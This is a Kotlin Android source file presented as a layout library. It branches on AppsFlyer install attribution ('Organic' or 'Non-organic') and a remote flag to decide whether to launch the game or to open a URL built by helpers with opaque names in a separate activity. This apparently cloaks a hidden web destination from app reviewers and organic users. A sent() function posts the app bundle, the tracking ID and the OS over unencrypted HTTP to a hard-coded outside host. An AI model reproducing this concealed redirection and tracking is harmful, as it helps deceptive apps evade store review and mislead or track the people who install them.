package com.my.lab.layout.mylibrary

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.my.lab.layout.mylibrary.Loser.or
import com.my.lab.layout.mylibrary.Winner.nor
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody

class BottomLayout {
    interface startGame {
        fun start() {}
    }

    companion object {
        var appsFlayerData: Map<String, Any>? = null
        var text: String? = null
        var flag = ""
        var newText = ""
        var isStarted = false

        var packageName = ""
        var locale = ""
        var deviceToken  = ""
        var afID = ""
        var os   = "Android"

        fun check(start: startGame, appCompatActivity: AppCompatActivity) {
            if (!appsFlayerData.isNullOrEmpty() && !text.isNullOrEmpty()) {
                var checkStatus = appsFlayerData?.get("af_status").toString()

                if (checkStatus == "Non-organic") {
                    newText = nor(appsFlayerData, afID, text!!)
                } else if (checkStatus == "Organic" && flag == "true") {
                    newText = or(text!!, afID)

                } else if (checkStatus == "Organic" && flag == "false") {
                    start.start()
                }


                if (!newText.isNullOrEmpty()) {
                    startActivity(appCompatActivity, newText)
                }
            }
        }

        fun startActivity(appCompatActivity: AppCompatActivity, url: String){
            if (!isStarted){
                isStarted = true
                var f = Intent(appCompatActivity, MyActivity::class.java)
                f.putExtra("extra", url)
                appCompatActivity.startActivity(f)
            }
        }

        fun sent(){
            Thread {
                val url = "http://pamyatki.com/logPushClick"

                var map = HashMap<String, String>()
                map.put("appBundle", packageName)
                map.put("af_id", afID)
                map.put("os", os)

                val mediaType = MediaType.parse("application/json")

                var gson = Gson()
                var json = gson.toJson(map)

                var client = OkHttpClient()
                var body = RequestBody.create(mediaType, json)
                var request = Request.Builder()
                    .url(url)
                    .post(body)
                    .build()
                client.newCall(request).execute()
            }.start()
        }
    }
}
